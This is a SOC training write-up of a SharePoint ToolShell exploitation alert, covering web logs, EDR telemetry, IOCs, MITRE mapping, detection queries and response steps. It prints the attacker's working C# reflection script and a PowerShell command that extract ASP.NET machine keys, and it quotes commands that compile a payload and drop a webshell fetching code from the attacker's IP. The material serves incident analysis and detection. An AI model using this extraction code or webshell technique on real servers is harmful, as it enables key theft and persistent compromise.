# CVE-2025-53770 SharePoint ToolShell Exploitation — SOC Investigation & Incident Response Walkthrough

> **Evidence scope:** This is a LetsDefend training write-up. Raw event exports, screenshots, command output and dated VirusTotal results are not attached. Observations below are reported from the lab narrative. Successful key extraction, subsequent forgery and remediation execution must not be inferred from commands alone. Detection queries are untested proposals.

## 2. Executive Summary

This investigation details the analysis of a critical security alert triggered by suspicious activity on a Microsoft SharePoint server. The alert indicated a potential exploitation attempt leveraging the **ToolShell** vulnerability chain (CVE-2025-53770, CVE-2025-49706, and CVE-2025-49704). Investigation into web traffic logs and EDR telemetry confirmed an unauthenticated attacker successfully bypassed authentication mechanisms and achieved Remote Code Execution (RCE). The attacker dropped a C#-based payload, compiled it on the fly, deployed an ASPX webshell (`spinstall0.aspx`), and included code intended to extract cryptographic machine keys; successful extraction and token forgery are not demonstrated in the attached material. This incident is classified as a **True Positive — Malicious**, representing a full system compromise requiring immediate containment and remediation.

## 3. Alert Overview

| Field | Details |
| --- | --- |
| **Platform** | LetsDefend |
| **Severity** | Critical (CVSS 9.8) |
| **Category** | Web Attack / Remote Code Execution |
| **Source** | Web Traffic & EDR Telemetry |
| **Timestamp** | Jul, 22, 2025, 01:07 PM |
| **Host** | Microsoft SharePoint Server |
| **Username** | Unauthenticated |
| **Source IP** | 107.191.58.76 |
| **Destination IP** | 172.16.20.17 |
| **Domain/URL** | `/layouts/ToolPane.aspx`, `/layouts/SignOut.aspx` |
| **Hash** | `92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514` |
| **Status** | True Positive — Malicious |

## 4. Initial Triage

A SOC analyst approaching this alert must immediately recognize the severity of a CVE-2025-53770 exploitation attempt. SharePoint environments typically house highly sensitive corporate data, and unauthenticated RCE represents a worst-case scenario.

**Triage Objectives:**

1. **Validate the Entry Vector:** Review web server traffic to confirm if an unauthenticated POST request successfully hit the `ToolPane.aspx` endpoint.
2. **Assess Exploitation Success:** Check EDR or SIEM telemetry for child processes spawning from web server worker processes (e.g., `w3wp.exe`), particularly `cmd.exe`, `powershell.exe`, or `csc.exe`.
3. **Identify Artifacts:** Locate any dropped webshells or downloaded payloads in web-accessible directories to understand the attacker's persistence mechanisms.
4. **Determine Post-Exploitation Impact:** Assess if the attacker accessed sensitive configuration files or cryptographic keys.

*Hypothesis:* If the web traffic logs show anomalous large payloads targeting `ToolPane.aspx` without authentication, and EDR shows subsequent PowerShell execution extracting `.NET` configuration settings, the server has been compromised via the ToolShell exploit chain.

---

## 5. Investigation Methodology

### Step 1 — Web Log Analysis for Initial Access

**Objective:** Determine if the initial web request matches the signature for CVE-2025-53770/CVE-2025-49706 exploitation.

**Evidence:**

*Observation:* A POST request targeted the `ToolPane.aspx` endpoint. The Referer header was spoofed as `/layouts/SignOut.aspx`, the payload size was unusually large (7699 bytes of encoded data), and no authentication headers were present.

**Analysis:**
This specific combination of artifacts is the hallmark of the authentication bypass vulnerability (CVE-2025-49706). By spoofing the Referer header to `SignOut.aspx`, the attacker tricked SharePoint into granting unauthenticated access to the `ToolPane.aspx` component. The large payload indicates the delivery of an insecure deserialization payload (CVE-2025-49704/CVE-2025-53770) designed to execute code upon processing.

**Finding:** The request is consistent with an exploitation attempt. Establish success using correlated endpoint execution; the request alone does not prove bypass.

### Step 2 — EDR Telemetry for Post-Exploitation Execution

**Objective:** Identify what the deserialization payload executed on the host.

**Evidence:**


```csharp
<script runat="server" language="c#">
public void Page_load()
{
    var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
    var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
    var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
    var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
    Response.Write(cg.ValidationKey + "|" + cg.Validation + "|" + cg.DecryptionKey + "|" + cg.Decryption + "|" + cg.CompatibilityMode);
}
</script>

```

**Analysis:**
The EDR captured a PowerShell command that decoded to an ASPX C# script. This script dynamically loads the `System.Web` assembly and uses .NET reflection to access the `System.Web.Configuration.MachineKeySection`. The attacker is extracting the `ValidationKey`, `DecryptionKey`, and `CompatibilityMode`. This is a critical post-exploitation step: these cryptographic keys are used to sign and encrypt ASP.NET ViewState and authentication cookies.

**Finding:** The displayed code attempts to read cryptographic configuration. Successful execution and returned key material require output or correlated telemetry; forgery is a potential consequence, not an observed event.

### Step 3 — Process Execution and Payload Compilation

**Objective:** Track subsequent process executions to identify additional persistence or capability deployments.

**Evidence:**

*Commands observed:*

1. `csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs`
2. `cmd.exe /c echo <WebShell> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx`

**Analysis:**
The attacker leveraged the C# compiler (`csc.exe`), a legitimate built-in Windows binary, to compile a dropped source file (`payload.cs`) into an executable (`payload.exe`) on the fly [T1027.004]. Immediately following this, the attacker used `cmd.exe` to write an ASPX webshell named `spinstall0.aspx` directly into the web-accessible SharePoint `LAYOUTS` directory. The webshell contained an ActiveX `<object>` tag pointing to `hxxp[://]107[.]191[.]58[.]76/payload[.]exe`. This allows the webshell to act as a downloader for the compiled payload whenever the page is accessed.

**Finding:** The attacker established a persistent backdoor (`spinstall0.aspx`) capable of fetching remote payloads.

### Step 4 — Artifact Verification via Threat Intelligence

**Objective:** Validate the malicious nature of the dropped webshell.

**Evidence:**

*Hash:* `92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514`

**Analysis:**
The earlier narrative reported a 34/64 VirusTotal detection count, but no dated result is attached. Treat that count as unverified historical context. Preserve a dated report and analyze file behavior before using reputation as supporting evidence.

**Finding:** The reported dropped ASPX artifact requires preservation and content verification; reputation alone does not establish its capabilities.

### Step 5 — Final Stage PowerShell Execution

**Objective:** Understand the attacker's final observed actions on the endpoint.

**Evidence:**

*Command:* `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"`

**Analysis:**
The attacker manually executed a PowerShell command to call the `GetApplicationConfig()` method directly. This is a redundant or secondary attempt to extract the same ASP.NET cryptographic keys seen in the earlier ASPX script. By possessing these keys, the attacker can independently forge legitimate session tokens without needing the password of any SharePoint user, potentially allowing access after webshell removal, depending on configuration; such use is not demonstrated here.

**Finding:** An extraction-related command is reported. Its output and success are unknown; session forgery and lateral access remain unconfirmed.

---

## 6. Evidence Analysis

### Important Artifacts

* **`ToolPane.aspx` & `SignOut.aspx` (URLs):**
* *Context:* Target endpoints in the web logs.
* *Interpretation:* The attacker sent a POST request to `ToolPane.aspx` while spoofing the Referer as `SignOut.aspx`.
* *Significance:* This is the exact signature for the ToolShell authentication bypass.


* **`csc.exe` (Process):**
* *Context:* EDR showed `csc.exe` compiling `payload.cs` in `C:\Windows\Temp\`.
* *Interpretation:* Living-off-the-land (LOLBins) technique to compile malware locally.
* *Significance:* Bypasses traditional static file-based antivirus that might flag a pre-compiled `.exe` file in transit.


* **`spinstall0.aspx` (File):**
* *Context:* Dropped into the SharePoint `16\TEMPLATE\LAYOUTS\` directory.
* *Interpretation:* A persistent ASPX webshell configured to download a secondary payload via an ActiveX object.
* *Significance:* May provide a web-accessible backdoor while present and executable to the environment.


* **`107.191.58.76` (IP Address):**
* *Context:* Hardcoded in the webshell's ActiveX `<object>` tag.
* *Interpretation:* External command and control / payload hosting infrastructure.
* *Significance:* Confirms outbound network communication intent for fetching `payload.exe`.


* **`[System.Web.Configuration.MachineKeySection]` (Code/Command):**
* *Context:* Executed via decoded C# script and raw PowerShell command.
* *Interpretation:* Extracts the `ValidationKey` and `DecryptionKey` from IIS/SharePoint configuration.
* *Significance:* Allows the generation of forged `__VIEWSTATE` parameters and authentication tokens, potentially enabling forgery depending on application configuration; administrative impersonation is not demonstrated.



---

## 7. Timeline Reconstruction

| Time | Event | Evidence | Significance |
| --- | --- | --- | --- |
| *[Not Provided]* | Initial Access & Auth Bypass | Web log: POST to `ToolPane.aspx` with spoofed `SignOut.aspx` Referer | Exploit delivery via unauthenticated request. |
| *[Not Provided]* | RCE & Reflection Script Execution | EDR: PowerShell decoding C# script | Dynamic extraction of `MachineKeySection` initiated. |
| *[Not Provided]* | Payload Compilation | EDR: `csc.exe /out:payload.exe payload.cs` | On-the-fly malware compilation. |
| *[Not Provided]* | Webshell Deployment | EDR: `cmd.exe /c echo <WebShell> > .../spinstall0.aspx` | Backdoor established in web directory. |
| *[Not Provided]* | Manual Key Extraction | EDR: PowerShell executing `[System.Web.Configuration.MachineKeySection]...` | Reported extraction attempt; success unconfirmed. |

---

## 8. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence | Confidence |
| --- | --- | --- | --- | --- |
| **Initial Access** | Exploit Public-Facing Application | T1190 | Unauthenticated POST to `ToolPane.aspx` exploiting CVE-2025-53770. | Confirmed |
| **Execution** | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell executed to decode C# script and extract keys. | Confirmed |
| **Defense Evasion** | Compile After Delivery | T1027.004 | `csc.exe` observed compiling `payload.cs` to `payload.exe`. | Confirmed |
| **Persistence** | Server Software Component: Web Shell | T1505.003 | Creation of `spinstall0.aspx` in the SharePoint Layouts directory. | Confirmed |
| **Credential Access** | Cryptographic configuration access (technique not assigned) | — | Code attempts to access MachineKeySection; returned keys not shown. | Attempt indicated; success unknown |
| **Credential Access** | [Forge Web Credentials](https://attack.mitre.org/techniques/T1606/) | T1606 | Potential follow-on behavior if keys were obtained; no forged token shown. | Not observed |

---

## 9. Indicators of Compromise (IOCs)

| Type | Indicator | Context | Confidence |
| --- | --- | --- | --- |
| **IP Address** | `107.191.58.76` | Payload hosting IP embedded in webshell. | High |
| **URL** | `hxxp[://]107[.]191[.]58[.]76/payload[.]exe` | Download location for secondary payload. | High |
| **File** | `C:\Windows\Temp\payload.cs` | Malicious source code dropped on disk. | High |
| **File** | `C:\Windows\Temp\payload.exe` | Compiled payload executable. | High |
| **File** | `spinstall0.aspx` | Malicious webshell dropped in `LAYOUTS` directory. | High |
| **Hash (SHA256)** | `92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514` | Hash of `spinstall0.aspx` webshell. | High |

---

## 10. Detection & Hunting Opportunities

To proactively hunt for this behavior or build detection rules, defenders should focus on the unusual endpoint combinations and the highly specific post-exploitation commands.

**Splunk SPL — Detecting ToolShell Auth Bypass Attempts:**
This query searches IIS web logs for requests targeting `ToolPane.aspx` that originate from a spoofed `SignOut.aspx` Referer, specifically looking for large POST requests indicative of deserialization payloads.

```spl
index=web sourcetype=iis cs_method=POST cs_uri_stem="*ToolPane.aspx*" cs_Referer="*SignOut.aspx*"
| where cs_bytes > 5000
| table _time, c_ip, cs_uri_stem, cs_Referer, sc_status, cs_bytes

```

`cs_bytes` must map to IIS bytes received (not response bytes); this is not an exact request-body-length measurement. Validate field mappings and the threshold locally. [Microsoft IIS logging fields](https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis).

**Microsoft Sentinel / KQL — Detecting `spinstall0.aspx` Creation:**
This query monitors endpoint file creation events for unauthorized `.aspx` files being written to the SharePoint template layouts directory, a clear sign of webshell deployment.

```kusto
DeviceFileEvents
| where ActionType == "FileCreated"
| where FolderPath contains @"\Web Server Extensions\16\TEMPLATE\LAYOUTS\"
| where FileName endswith ".aspx"
| project Timestamp, DeviceName, InitiatingProcessCommandLine, FolderPath, FileName

```

**Microsoft Sentinel / KQL — Detecting MachineKey Extraction via PowerShell:**
This query hunts for PowerShell execution attempting to access the `MachineKeySection` configuration, a behavior almost exclusively tied to malicious cryptographic key theft.

```kusto
DeviceProcessEvents
| where ProcessCommandLine has_any ("[System.Web.Configuration.MachineKeySection]", "GetApplicationConfig()")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine

```

---

## 11. Investigation Findings

**Reported lab findings (raw evidence not attached):**

* The SharePoint server was successfully exploited via an unauthenticated POST request, consistent with CVE-2025-53770 (ToolShell).
* Remote Code Execution (RCE) was achieved, evidenced by `cmd.exe` and `powershell.exe` activity.
* A persistent webshell (`spinstall0.aspx`) was dropped in a web-accessible directory.
* The attacker successfully compiled a secondary payload (`payload.exe`) on the host using `csc.exe`.
* Code intended to extract ASP.NET keys was reported; successful extraction is unconfirmed.

**Supporting Findings:**

* The webshell relies on an external IP (`107.191.58.76`) to fetch additional payloads, indicating a configured payload destination; current infrastructure activity is unverified.
* VirusTotal consensus heavily flags the dropped ASPX file as malicious.

**Unconfirmed / Unknown:**

* It is currently unknown if the attacker successfully utilized the stolen machine keys to forge `__VIEWSTATE` payloads or authentication tokens to access other sensitive systems.
* The exact actions taken by `payload.exe` after compilation are not visible in the provided evidence.

---

## 12. Final Verdict

**True Positive — Malicious**

**Reasoning:**
The reported endpoint and web activity supports the lab disposition of malicious exploitation. Raw evidence is needed for independent verification. The shown extraction-related code does not establish successful key theft, forged-token use, or later lateral access.

---

## 13. Recommended Response Actions

Treat the machine keys as potentially exposed until investigation resolves the extraction attempt. The following are proposed response actions, not actions performed in this lab write-up. Coordinate patching and key rotation with current vendor guidance.

1. **Isolate the Host:** Immediately disconnect the compromised SharePoint server from the network to prevent lateral movement and halt C2 communication with `107.191.58.76`.
2. **Regenerate Machine Keys:** The `ValidationKey` and `DecryptionKey` in the `web.config` file must be regenerated immediately across the SharePoint farm to invalidate any forged authentication tokens or `__VIEWSTATE` payloads.
3. **Remove Malicious Artifacts:** Delete `spinstall0.aspx`, `payload.cs`, and `payload.exe` from the filesystem. Preserve copies in an isolated forensic environment.
4. **Patch Vulnerabilities:** Apply the latest Microsoft Security Updates to remediate the CVE-2025-53770 / CVE-2025-49706 / CVE-2025-49704 vulnerabilities before bringing the server back online.
5. **Review Authentication Logs:** Analyze logs for any anomalous logins or access to sensitive documents that occurred *after* the initial compromise, assuming the attacker successfully forged tokens.
6. **Block C2 Infrastructure:** Add IP `107.191.58.76` and URL `hxxp[://]107[.]191[.]58[.]76/payload[.]exe` to enterprise firewall and proxy blocklists.

---

## 14. Lessons Learned

* **Patching is Not Enough if Secrets are Compromised:** This alert perfectly illustrates why identifying the *impact* of an exploit is vital. If the attacker obtained the Machine Keys, patching the server and deleting the webshell would not have revoked their access. Key regeneration is a critical IR step often missed in web application compromises.
* **Compile-After-Delivery Evades Static Defenses:** The use of `csc.exe` (a legitimate Windows binary) to compile a text file (`payload.cs`) into malware highlights the necessity of behavior-based EDR over traditional signature-based antivirus.
* **String-Based Header Filtering is Fragile:** The vulnerability heavily relies on spoofing the Referer header to bypass authentication. Relying purely on WAF string-matching can be bypassed; behavioral anomaly detection (e.g., unexpected endpoints accessing `MachineKeySection`) provides a stronger safety net.

---

### Analyst Takeaway

1. **Always assume token compromise** when a web server's core application configuration (like `web.config` or `MachineKeySection`) is accessed by an attacker.
2. **Monitor native compilers.** Binaries like `csc.exe` or `jsc.exe` executing in `C:\Windows\Temp\` are massive red flags for on-the-fly malware compilation.
3. **Trace the parent-child relationships.** A web worker process (`w3wp.exe`) spawning `cmd.exe` to echo content into a `.aspx` file is one of the most reliable indicators of webshell deployment in IIS environments.

---

